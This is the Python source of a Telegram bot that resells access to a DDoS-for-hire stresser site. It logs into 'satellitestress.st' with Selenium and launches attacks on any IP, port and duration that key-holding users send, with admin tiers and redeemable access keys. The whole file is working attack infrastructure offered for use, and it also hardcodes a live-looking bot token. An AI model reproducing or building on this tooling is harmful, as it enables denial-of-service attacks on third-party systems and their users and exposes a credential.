import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
BOT_TOKEN = "8565602489:AAHxv4q-bU4i-zMi2avsFmcwUq-8-oIqS_E"
OWNER_ID = 7671909515
CHROME_PATH = "/usr/bin/google-chrome"

# Data files
DATA_JSON = "users_data.json"
DATA_TXT = "users_data.txt"
COOKIES_FILE = "session_cookies.pkl"

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
driver = None
logged_in = False
data = {
    "approved_users": {},  # {user_id: {"expiry": "2024-01-01", "approved_by": admin_id}}
    "admins": {},  # {user_id: {"expiry": "2024-01-01", "added_by": owner_id}}
    "keys": {},  # {key: {"days": 30, "created_by": admin_id, "redeemed": False, "redeemed_by": None}}
    "disapproved_users": []  # [user_id1, user_id2]
}

# --- Data Management Functions ---
def load_data():
    """Load data from JSON file"""
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info("Data loaded from JSON")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    """Save data to both JSON and TXT files"""
    try:
        # Save to JSON
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        
        # Save to TXT (human readable)
        with open(DATA_TXT, 'w') as f:
            f.write("=" * 50 + "\n")
            f.write("📊 USER DATA - LAST UPDATED: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
            f.write("=" * 50 + "\n\n")
            
            f.write("✅ APPROVED USERS:\n")
            f.write("-" * 50 + "\n")
            for user_id, info in data.get("approved_users", {}).items():
                f.write(f"👤 User ID: {user_id}\n")
                f.write(f"  ⏰ Expiry: {info.get('expiry', 'N/A')}\n")
                f.write(f"  👮 Approved By: {info.get('approved_by', 'N/A')}\n")
                f.write(f"  ⏳ Time Left: {get_time_left(info.get('expiry', ''))}\n\n")
            
            f.write("\n👮 ADMINS:\n")
            f.write("-" * 50 + "\n")
            for user_id, info in data.get("admins", {}).items():
                f.write(f"👤 User ID: {user_id}\n")
                f.write(f"  ⏰ Expiry: {info.get('expiry', 'N/A')}\n")
                f.write(f"  🔑 Added By: {info.get('added_by', 'N/A')}\n")
                f.write(f"  ⏳ Time Left: {get_time_left(info.get('expiry', ''))}\n\n")
            
            f.write("\n🎟️ KEYS:\n")
            f.write("-" * 50 + "\n")
            for key, info in data.get("keys", {}).items():
                f.write(f"🔑 Key: {key}\n")
                f.write(f"  📅 Days: {info.get('days', 0)}\n")
                f.write(f"  👤 Created By: {info.get('created_by', 'N/A')}\n")
                f.write(f"  ✓ Redeemed: {info.get('redeemed', False)}\n")
                f.write(f"  👤 Redeemed By: {info.get('redeemed_by', 'N/A')}\n\n")
            
            f.write("\n❌ DISAPPROVED USERS:\n")
            f.write("-" * 50 + "\n")
            for user_id in data.get("disapproved_users", []):
                f.write(f"👤 User ID: {user_id}\n")
        
        logger.info("Data saved to JSON and TXT")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def get_time_left(expiry_str):
    """Calculate time left until expiry"""
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        delta = expiry - now
        if delta.days < 0:
            return "⚠️ Expired"
        return f"✅ {delta.days} days"
    except:
        return "N/A"

def generate_random_key():
    """Generate a 20-character random key"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    """Check if user is owner"""
    return user_id == OWNER_ID

def is_admin(user_id):
    """Check if user is admin and not expired"""
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                # Remove expired admin
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    """Check if user is approved and not expired"""
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                # Remove expired approval
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_disapproved(user_id):
    """Check if user is disapproved"""
    return user_id in data.get("disapproved_users", [])

# --- Cookie Management ---
def save_cookies():
    """Save browser cookies"""
    global driver
    try:
        if driver:
            cookies = driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
            logger.info("Cookies saved")
    except Exception as e:
        logger.error(f"Error saving cookies: {e}")

def load_cookies():
    """Load browser cookies"""
    global driver
    try:
        if driver and os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            for cookie in cookies:
                driver.add_cookie(cookie)
            logger.info("Cookies loaded")
            return True
    except Exception as e:
        logger.error(f"Error loading cookies: {e}")
    return False

# --- Browser Management ---
def get_actual_chrome_path():
    """Resolves symlinks like /usr/bin/google-chrome to the real binary location"""
    if os.path.exists(CHROME_PATH):
        return os.path.realpath(CHROME_PATH)
    return None

async def initialize_browser():
    """Initialize browser in background"""
    global driver
    try:
        if driver:
            return True
        
        real_path = get_actual_chrome_path()
        chrome_options = Options()
        if real_path:
            chrome_options.binary_location = real_path
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        logger.info("Browser initialized")
        return True
    except Exception as e:
        logger.error(f"Browser initialization error: {e}")
        return False

# --- Keyboard Builders ---
def get_owner_keyboard():
    """Build keyboard for owner"""
    keyboard = [
        [InlineKeyboardButton("🔐 Login", callback_data="login"),
         InlineKeyboardButton("🔍 Check Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats"),
         InlineKeyboardButton("🔴 Logout", callback_data="logout")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    """Build keyboard for admin"""
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_approved_keyboard():
    """Build keyboard for approved users"""
    keyboard = [
        [InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard():
    """Build keyboard for regular users"""
    keyboard = [
        [InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - available to all"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    
    welcome_msg = f"👋 **Welcome {user_name}!**\n\n"
    
    if is_owner(user_id):
        welcome_msg += "🔑 **You are the Owner**\n"
        welcome_msg += "You have full access to all features.\n\n"
        welcome_msg += "🎮 **Use the buttons below to control the bot:**"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        welcome_msg += "👮 **You are an Admin**\n"
        welcome_msg += "You can manage users and create keys.\n\n"
        welcome_msg += "🎮 **Use the buttons below:**"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        welcome_msg += "✅ **You are Approved**\n"
        welcome_msg += "You can run attacks.\n\n"
        welcome_msg += "🎮 **Use the buttons below:**"
        keyboard = get_approved_keyboard()
    else:
        welcome_msg += "📌 **Welcome to the Bot**\n"
        welcome_msg += "Redeem a key to get access.\n\n"
        welcome_msg += "🎮 **Use the buttons below:**"
        keyboard = get_user_keyboard()
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

# --- Callback Query Handler ---
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    callback_data = query.data
    
    # Owner-only buttons
    if callback_data == "login":
        if not is_owner(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner can use this.")
            return
        await query.message.reply_text("🚀 **Starting login process...**", parse_mode='Markdown')
        await start_login_flow(query.message, context)
        return
    
    elif callback_data == "check":
        if not is_owner(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner can use this.")
            return
        await check_status(query.message, context)
        return
    
    elif callback_data == "logout":
        if not is_owner(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner can use this.")
            return
        await logout_session(query.message, context)
        return
    
    # Admin buttons
    elif callback_data == "approve":
        if not is_admin(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner/admin can use this.")
            return
        user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
        await query.message.reply_text("✅ **Approve User**\n\nPlease send: `<user_id> <days>`\nExample: `123456789 30`", parse_mode='Markdown')
        return
    
    elif callback_data == "disapprove":
        if not is_admin(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner/admin can use this.")
            return
        user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
        await query.message.reply_text("❌ **Disapprove User**\n\nPlease send the user ID to disapprove:\nExample: `123456789`", parse_mode='Markdown')
        return
    
    elif callback_data == "add_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner/admin can use this.")
            return
        user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("👮 **Add Admin**\n\nPlease send: `<user_id> <days>`\nExample: `987654321 60`", parse_mode='Markdown')
        return
    
    elif callback_data == "remove_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner/admin can use this.")
            return
        user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("🚫 **Remove Admin**\n\nPlease send the user ID to remove:\nExample: `987654321`", parse_mode='Markdown')
        return
    
    elif callback_data == "gen_key":
        if not is_admin(user_id):
            await query.message.reply_text("❌ **Not authorized.** Only owner/admin can use this.")
            return
        user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
        await query.message.reply_text("🎟️ **Generate Access Key**\n\nPlease send the number of days:\nExample: `30`", parse_mode='Markdown')
        return
    
    elif callback_data == "run":
        if not is_approved(user_id):
            await query.message.reply_text("❌ **Not authorized.** You need approval to use this command.")
            return
        user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
        await query.message.reply_text("🚀 **Run Attack**\n\nPlease send: `<IP> <PORT> <TIME>`\nExample: `192.168.1.1 80 300`", parse_mode='Markdown')
        return
    
    elif callback_data == "stats":
        await show_stats(query.message, user_id)
        return
    
    elif callback_data == "my_status":
        await show_my_status(query.message, user_id)
        return
    
    elif callback_data == "redeem_key":
        user_state[user_id] = {'action': 'redeem', 'step': 'awaiting_key'}
        await query.message.reply_text("🎟️ **Redeem Key**\n\nPlease send your access key:\nExample: `AbCdEfGhIjKlMnOpQrSt`", parse_mode='Markdown')
        return

# --- Message Handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages based on user state"""
    user_id = update.effective_user.id
    text = update.message.text
    
    # Check if user is in login flow (owner only)
    if user_id == OWNER_ID:
        state = user_state.get(OWNER_ID, {}).get('step')
        if state == 'waiting_token':
            await enter_token(update, context, text)
            return
        elif state == 'waiting_captcha':
            await enter_captcha(update, context, text)
            return
    
    # Check if user has pending action
    if user_id not in user_state:
        await update.message.reply_text("❓ Please use /start to see available options.")
        return
    
    action = user_state[user_id].get('action')
    
    if action == 'approve':
        await process_approve(update, context, text)
    elif action == 'disapprove':
        await process_disapprove(update, context, text)
    elif action == 'add_admin':
        await process_add_admin(update, context, text)
    elif action == 'remove_admin':
        await process_remove_admin(update, context, text)
    elif action == 'gen_key':
        await process_gen_key(update, context, text)
    elif action == 'run':
        await process_run(update, context, text)
    elif action == 'redeem':
        await process_redeem(update, context, text)

# --- Process Functions ---
async def process_approve(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process approve user action"""
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Please send: `<user_id> <days>`", parse_mode='Markdown')
            return
        
        target_id = parts[0]
        days = int(parts[1])
        
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        
        data["approved_users"][target_id] = {
            "expiry": expiry_date,
            "approved_by": user_id
        }
        
        # Remove from disapproved if present
        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))
        
        save_data()
        
        await update.message.reply_text(
            f"✅ **User Approved!**\n\n"
            f"👤 User ID: `{target_id}`\n"
            f"📅 Duration: {days} days\n"
            f"⏰ Expires: {expiry_date}",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def process_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process disapprove user action"""
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())
        
        # Remove from approved users
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        
        # Add to disapproved
        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)
        
        save_data()
        
        await update.message.reply_text(
            f"❌ **User Disapproved!**\n\n"
            f"👤 User ID: `{target_id}`\n"
            f"✓ Access revoked",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def process_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process add admin action"""
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Please send: `<user_id> <days>`", parse_mode='Markdown')
            return
        
        target_id = parts[0]
        days = int(parts[1])
        
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        
        data["admins"][target_id] = {
            "expiry": expiry_date,
            "added_by": user_id
        }
        
        save_data()
        
        await update.message.reply_text(
            f"👮 **Admin Added!**\n\n"
            f"👤 User ID: `{target_id}`\n"
            f"📅 Duration: {days} days\n"
            f"⏰ Expires: {expiry_date}",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def process_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process remove admin action"""
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(
                f"🚫 **Admin Removed!**\n\n"
                f"👤 User ID: `{target_id}`\n"
                f"✓ Admin privileges revoked",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"❌ User `{target_id}` is not an admin.", parse_mode='Markdown')
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def process_gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process generate key action"""
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()
        
        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }
        
        save_data()
        
        await update.message.reply_text(
            f"🎟️ **Access Key Generated!**\n\n"
            f"🔑 Key: `{key}`\n"
            f"📅 Valid for: {days} days\n"
            f"✨ Status: Not redeemed\n\n"
            f"ℹ️ Share this key with users to grant them access.",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def process_run(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process run attack action"""
    global driver, logged_in
    user_id = update.effective_user.id
    
    # Check if logged in
    if not logged_in or not driver:
        await update.message.reply_text("❌ **Server is under work.** Please wait.")
        return
    
    try:
        parts = text.strip().split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format. Please send: `<IP> <PORT> <TIME>`", parse_mode='Markdown')
            return
        
        ip, port, duration = parts
        
        await update.message.reply_text(f"⚡ **Preparing attack...**\n\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`", parse_mode='Markdown')
        
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)  # Wait for the 'Establishing Connection' overlay to pass
        
        wait = WebDriverWait(driver, 20)
        
        # Fill IP
        ip_in = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']")))
        ip_in.clear()
        ip_in.send_keys(ip)
        
        # Fill Port
        port_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']")
        port_in.clear()
        port_in.send_keys(port)
        
        # Fill Time
        time_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']")
        time_in.clear()
        time_in.send_keys(duration)
        
        # Click launch button
        launch_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Launch Attack')]")))
        driver.execute_script("arguments[0].click();", launch_btn)
        
        await asyncio.sleep(2)
        
        # Send success message without screenshot
        await update.message.reply_text(
            f"🚀 **Attack Started!**\n\n"
            f"🎯 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱️ Duration: `{duration}s`\n\n"
            f"✅ Command dispatched successfully!",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Attack Error:** {str(e)}")

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Process redeem key action"""
    user_id = update.effective_user.id
    try:
        key = text.strip()
        
        if key not in data.get("keys", {}):
            await update.message.reply_text("❌ **Invalid key.**")
            user_state.pop(user_id, None)
            return
        
        key_data = data["keys"][key]
        
        if key_data.get("redeemed"):
            await update.message.reply_text("❌ **This key has already been redeemed.**")
            user_state.pop(user_id, None)
            return
        
        # Redeem key
        days = key_data.get("days", 0)
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        
        data["approved_users"][str(user_id)] = {
            "expiry": expiry_date,
            "approved_by": "key_redemption"
        }
        
        data["keys"][key]["redeemed"] = True
        data["keys"][key]["redeemed_by"] = user_id
        
        save_data()
        
        await update.message.reply_text(
            f"🎉 **Key Redeemed Successfully!**\n\n"
            f"✅ You now have access!\n"
            f"📅 Valid for: {days} days\n"
            f"⏰ Expires: {expiry_date}\n\n"
            f"🚀 Use /start to see your options.",
            parse_mode='Markdown'
        )
        
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# --- Login Flow ---
async def start_login_flow(message, context: ContextTypes.DEFAULT_TYPE):
    """Start the login automation"""
    global driver, logged_in
    try:
        # Initialize browser if not already
        if not driver:
            await initialize_browser()
        
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)  # Wait for cloudflare/loading
        
        # Try to load cookies
        if load_cookies():
            driver.refresh()
            await asyncio.sleep(5)
            
            # Check if already logged in
            if "dashboard" in driver.current_url or "attack" in driver.current_url:
                logged_in = True
                await message.reply_text("✅ **Already logged in!** Session restored from cookies. 🍪", parse_mode='Markdown')
                return
        
        # Need to login
        driver.save_screenshot("login_screen.png")
        with open("login_screen.png", 'rb') as photo:
            await message.reply_photo(photo=photo, caption="📸 **Login Page Loaded.**\n\n🔑 Please send the **Access Token**:")
        os.remove("login_screen.png")
        
        user_state[OWNER_ID] = {'step': 'waiting_token'}
    except Exception as e:
        await message.reply_text(f"❌ **Login Error:** {str(e)}")

async def enter_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    """Enter token in login form"""
    try:
        wait = WebDriverWait(driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        
        user_state[OWNER_ID] = {'step': 'waiting_captcha'}
        driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ **Token Entered.**\n\n🔢 Now send the **Captcha** characters:")
        os.remove("captcha_view.png")
    except Exception as e:
        await update.message.reply_text(f"❌ **Token Error:** {str(e)}")

async def enter_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    """Enter captcha and complete login"""
    global logged_in
    try:
        captcha_field = driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        
        login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        
        await asyncio.sleep(6)  # Wait for dashboard redirect
        
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            save_cookies()  # Save session cookies
            await update.message.reply_text(
                "✅ **Login Success!** 🎉\n\n"
                "💾 Session saved with cookies.\n"
                "🚀 You can now use the attack feature!",
                parse_mode='Markdown'
            )
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ **Login failed.** Use the Login button to retry.")
            os.remove("fail.png")
    except Exception as e:
        await update.message.reply_text(f"❌ **Login Error:** {str(e)}")
    finally:
        user_state.pop(OWNER_ID, None)

# --- Status Functions ---
async def check_status(message, context: ContextTypes.DEFAULT_TYPE):
    """Check login status"""
    global driver, logged_in
    
    if not driver:
        await message.reply_text("❌ **Browser not initialized.** Use the Login button to start.", parse_mode='Markdown')
        return
    
    try:
        current_url = driver.current_url
        
        if "dashboard" in current_url or "attack" in current_url:
            logged_in = True
            await message.reply_text(
                "✅ **Status: LOGGED IN** 🟢\n\n"
                "🌐 Session is active.\n"
                "🚀 Ready for attacks!",
                parse_mode='Markdown'
            )
        else:
            logged_in = False
            await message.reply_text(
                "❌ **Status: NOT LOGGED IN** 🔴\n\n"
                "⚠️ Please use the Login button to authenticate.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logged_in = False
        await message.reply_text(
            f"❌ **Status: ERROR** ⚠️\n\n"
            f"🔧 Browser session lost.\n"
            f"🔄 Use the Login button to restart.\n\n"
            f"Error: {str(e)}",
            parse_mode='Markdown'
        )

async def show_stats(message, user_id):
    """Show statistics"""
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
    disapproved_count = len(data.get("disapproved_users", []))
    
    stats_msg = (
        f"📊 **System Statistics**\n\n"
        f"✅ Approved Users: {approved_count}\n"
        f"👮 Admins: {admin_count}\n"
        f"🎟️ Total Keys: {key_count}\n"
        f"✓ Redeemed Keys: {redeemed_count}\n"
        f"❌ Disapproved Users: {disapproved_count}\n\n"
        f"🔄 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    await message.reply_text(stats_msg, parse_mode='Markdown')

async def show_my_status(message, user_id):
    """Show user's own status"""
    if str(user_id) in data.get("approved_users", {}):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        time_left = get_time_left(expiry)
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"✅ Status: Approved\n"
            f"⏰ Expires: {expiry}\n"
            f"⏳ Time Left: {time_left}"
        )
    elif str(user_id) in data.get("admins", {}):
        expiry = data["admins"][str(user_id)].get("expiry")
        time_left = get_time_left(expiry)
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"👮 Status: Admin\n"
            f"⏰ Expires: {expiry}\n"
            f"⏳ Time Left: {time_left}"
        )
    elif is_owner(user_id):
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"🔑 Status: Owner\n"
            f"♾️ Access: Unlimited"
        )
    else:
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"❌ Status: No Access\n"
            f"💡 Redeem a key to get access!"
        )
    
    await message.reply_text(status_msg, parse_mode='Markdown')

async def logout_session(message, context: ContextTypes.DEFAULT_TYPE):
    """Logout and close browser"""
    global driver, logged_in
    if driver:
        driver.quit()
        driver = None
    logged_in = False
    await message.reply_text("✅ **Browser session closed.** 🔴", parse_mode='Markdown')

def main():
    """Main function"""
    # Load data on startup
    load_data()
    
    # Build application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Bot is active and waiting...")
    logger.info("Bot started successfully with button interface")
    
    # Run the bot
    app.run_polling()

if __name__ == '__main__':
    main()
